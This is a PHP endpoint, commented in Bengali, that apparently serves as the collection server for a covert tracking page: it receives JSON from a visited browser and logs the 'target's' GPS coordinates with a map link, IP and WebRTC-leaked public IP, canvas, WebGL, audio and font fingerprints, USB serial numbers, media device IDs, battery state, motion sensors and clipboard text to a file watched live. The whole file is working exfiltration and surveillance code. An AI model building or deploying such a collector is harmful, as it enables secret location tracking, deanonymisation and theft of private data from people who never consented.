<?php
header('Content-Type: application/json');

$jsonData = file_get_contents('php://input');
$data = json_decode($jsonData, true);

if (!$data) {
    http_response_code(400);
    echo json_encode(['status' => 'error', 'message' => 'No data']);
    exit;
}

// লোকাল টাইম বের করা
$targetLocalTime = date('Y-m-d H:i:s e');
if (isset($data['deviceInfo']['localTime'])) {
    $targetLocalTime = $data['deviceInfo']['localTime'];
}

// ============================================================
// ১. ওরিয়েন্টেশন ও মোশন → orientation.log + live_orientation.json
// ============================================================
if (isset($data['orientation'])) {
    $o = $data['orientation'];
    $entry = sprintf("[%s] Alpha: %6.2f | Beta: %6.2f | Gamma: %6.2f\n", $o['timestamp'], $o['alpha'], $o['beta'], $o['gamma']);
    file_put_contents('orientation.log', $entry, FILE_APPEND | LOCK_EX);
    file_put_contents('live_orientation.json', json_encode($o));
}
if (isset($data['motion'])) {
    $m = $data['motion'];
    $acc = $m['acceleration'];
    $rot = $m['rotationRate'];
    $entry = sprintf("[%s] Accel: x=%6.2f y=%6.2f z=%6.2f | Rot: a=%6.2f b=%6.2f g=%6.2f | Interval: %dms\n", $m['timestamp'], $acc['x'], $acc['y'], $acc['z'], $rot['alpha'], $rot['beta'], $rot['gamma'], $m['interval']);
    file_put_contents('orientation.log', $entry, FILE_APPEND | LOCK_EX);
}

// ============================================================
// ২. বাকি সব ডেটা → data.txt (লক ছাড়া, টার্মিনাল-বান্ধব)
// ============================================================
$shouldLog = isset($data['deviceInfo']) || isset($data['ipInfo']) || isset($data['gps']) || isset($data['gpsError']) || isset($data['networkInfo']) || isset($data['localIP']) || isset($data['canvasFingerprint']) || isset($data['webglFingerprint']) || isset($data['audioFingerprint']) || isset($data['fontsSignature']) || isset($data['clientRects']) || isset($data['jsEngine']) || isset($data['webrtcPublicIP']) || isset($data['mediaDevices']) || isset($data['usbDevices']) || isset($data['clipboardData']) || isset($data['batteryInfo']);

if ($shouldLog) {
    // 🔥 মূল ফিক্স: LOCK_EX সরানো হয়েছে এবং fopen/fwrite ব্যবহার করা হয়েছে
    $fp = fopen('data.txt', 'a');
    if ($fp) {
        $output = "\n" . str_repeat('=', 70) . "\n";
        $output .= "📅 Target Local Time: " . $targetLocalTime . "\n";
        $output .= str_repeat('-', 70) . "\n";
        
        if (isset($data['deviceInfo'])) {
            $output .= "📱 DEVICE INFORMATION\n";
            $output .= str_repeat('-', 40) . "\n";
            foreach ($data['deviceInfo'] as $key => $value) {
                if (is_array($value) || is_object($value)) $output .= "$key: " . json_encode($value) . "\n";
                else $output .= "$key: $value\n";
            }
        }
        
        if (isset($data['batteryInfo'])) {
            $output .= "\n🔋 BATTERY STATUS\n";
            $output .= str_repeat('-', 40) . "\n";
            foreach ($data['batteryInfo'] as $key => $value) $output .= "$key: $value\n";
        }
        
        if (isset($data['ipInfo'])) {
            $output .= "\n🌐 IP & LOCATION\n";
            $output .= str_repeat('-', 40) . "\n";
            foreach ($data['ipInfo'] as $key => $value) $output .= "$key: $value\n";
        }
        
        if (isset($data['gps'])) {
            $output .= "\n📍 GPS COORDINATES\n";
            $output .= str_repeat('-', 40) . "\n";
            foreach ($data['gps'] as $key => $value) $output .= "$key: $value\n";
            if (!empty($data['gps']['latitude']) && !empty($data['gps']['longitude'])) {
                $output .= "Google Maps: https://www.google.com/maps?q=" . $data['gps']['latitude'] . "," . $data['gps']['longitude'] . "\n";
            }
        }
        
        if (isset($data['networkInfo'])) {
            $output .= "\n📶 NETWORK INFORMATION\n";
            $output .= str_repeat('-', 40) . "\n";
            foreach ($data['networkInfo'] as $key => $value) $output .= "$key: $value\n";
        }
        
        if (isset($data['localIP'])) {
            $output .= "\n🌐 LOCAL IP ADDRESS\n";
            $output .= str_repeat('-', 40) . "\n";
            $output .= "Local IP: " . $data['localIP'] . "\n";
        }
        
        if (isset($data['webrtcPublicIP'])) {
            $output .= "\n🛰️ WEBRTC PUBLIC IP (লিক)\n";
            $output .= str_repeat('-', 40) . "\n";
            $output .= "Public IP: " . $data['webrtcPublicIP'] . "\n";
        }
        
        // ========== অ্যাডভান্সড ফিঙ্গারপ্রিন্টিং ==========
        if (isset($data['canvasFingerprint'])) {
            $output .= "\n🖌️ CANVAS FINGERPRINT (SHA-256)\n";
            $output .= str_repeat('-', 40) . "\n";
            $output .= "Hash: " . $data['canvasFingerprint'] . "\n";
        }
        
        if (isset($data['webglFingerprint'])) {
            $output .= "\n🎨 WEBGL FINGERPRINT\n";
            $output .= str_repeat('-', 40) . "\n";
            if (is_array($data['webglFingerprint'])) {
                foreach ($data['webglFingerprint'] as $key => $val) {
                    if (is_array($val)) $output .= "$key: " . json_encode($val) . "\n";
                    else $output .= "$key: $val\n";
                }
            } else {
                $output .= "Info: " . $data['webglFingerprint'] . "\n";
            }
        }
        
        if (isset($data['audioFingerprint'])) {
            $output .= "\n🔊 AUDIO FINGERPRINT\n";
            $output .= str_repeat('-', 40) . "\n";
            $output .= "Signature: " . substr($data['audioFingerprint'], 0, 200) . "...\n";
        }
        
        if (isset($data['fontsSignature'])) {
            $output .= "\n🔤 FONTS SIGNATURE\n";
            $output .= str_repeat('-', 40) . "\n";
            $output .= "Signature: " . $data['fontsSignature'] . "\n";
        }
        
        if (isset($data['clientRects'])) {
            $output .= "\n📐 CLIENT RECTS (পিক্সেল মাপ)\n";
            $output .= str_repeat('-', 40) . "\n";
            foreach ($data['clientRects'] as $key => $value) $output .= "$key: $value\n";
        }
        
        if (isset($data['jsEngine'])) {
            $output .= "\n🧠 JS ENGINE INFO\n";
            $output .= str_repeat('-', 40) . "\n";
            foreach ($data['jsEngine'] as $key => $value) $output .= "$key: $value\n";
        }
        
        if (isset($data['mediaDevices'])) {
            $output .= "\n🎥 MEDIA DEVICES\n";
            $output .= str_repeat('-', 40) . "\n";
            foreach ($data['mediaDevices'] as $d) {
                $output .= "  - " . $d['kind'] . " | " . $d['label'] . " (ID: " . $d['deviceId'] . ")\n";
            }
        }
        
        if (isset($data['usbDevices'])) {
            $output .= "\n🔌 USB DEVICES\n";
            $output .= str_repeat('-', 40) . "\n";
            foreach ($data['usbDevices'] as $d) {
                $output .= "  - " . $d['productName'] . " | " . $d['manufacturerName'] . " | SN: " . $d['serialNumber'] . "\n";
            }
        }
        
        if (isset($data['clipboardData'])) {
            $output .= "\n📋 CLIPBOARD DATA\n";
            $output .= str_repeat('-', 40) . "\n";
            $output .= "Text: " . $data['clipboardData'] . "\n";
        }
        
        if (isset($data['gpsError'])) {
            $output .= "\n❌ GPS ERROR\n";
            $output .= str_repeat('-', 40) . "\n";
            $output .= "Error: " . $data['gpsError'] . "\n";
        }
        
        $output .= str_repeat('=', 70) . "\n";
        
        // 🔥 লেখার সময় লক ব্যবহার করছি না, ফলে tail -f নির্বিঘ্নে পড়তে পারবে
        fwrite($fp, $output);
        fflush($fp); // 🔥 বাফার ফ্লাশ করে দিচ্ছি
        fclose($fp);
    }
}

// ============================================================
// ৩. JSON ব্যাকআপ
// ============================================================
file_put_contents('raw_data.json', $jsonData . "\n", FILE_APPEND | LOCK_EX);

echo json_encode(['status' => 'success']);
?>